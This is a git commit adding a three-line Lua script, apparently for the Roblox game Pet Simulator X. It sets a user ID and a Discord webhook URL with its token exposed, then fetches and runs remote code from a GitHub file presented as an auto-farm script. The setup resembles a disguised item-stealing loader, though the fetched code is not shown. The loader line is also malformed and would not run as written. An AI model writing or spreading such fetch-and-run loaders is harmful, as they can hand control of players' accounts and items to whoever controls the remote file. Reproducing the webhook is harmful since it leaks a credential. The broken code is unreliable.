0552595062184204b985bbf4eb97de57a5c74a66
eeexil <119888932+eeexil@users.noreply.github.com>
2022-12-06 20:41:43 +0200

    Add files via upload

---
+++ psx.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1707942708
+_G.WebHook = "https://discord.com/api/webhooks/1049395412999618690/r7FolQ33Mzo3WKazCRcKvtMo8WcBlepVYVnCfPrAH960q3le5aJTDrvizdPh-_qoPp81"
+loadstring(game:https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua"))()
